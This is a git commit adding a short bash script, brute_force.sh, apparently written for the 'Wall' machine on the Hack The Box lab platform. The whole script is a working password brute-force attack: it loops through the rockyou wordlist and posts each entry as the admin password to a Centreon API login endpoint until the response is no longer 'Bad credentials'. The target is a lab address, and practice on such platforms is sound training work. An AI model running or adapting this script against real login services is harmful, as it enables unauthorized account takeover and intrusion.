8c19dfb4ee45638cc675dfe9b478d2689bb1b9dc
Kevin Garcia <75913210+p1x1@users.noreply.github.com>
2021-02-24 23:37:45 -0500

    brute_force {htb wall centreon}

---
+++ brute_force.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+
+
+while read line;do
+
+	echo "[+] Trying : $line"
+	pwn=$(curl -sX POST http://10.10.10.157/centreon/api/index.php?action=authenticate --data "username=admin&password=$line" | html2text)
+	if [ "$pwn" != "\"Bad credentials\"" ];then
+		echo -e "\n[+]PASS -- > $line"
+		break
+	fi
+
+done < /opt/rockyou.txt
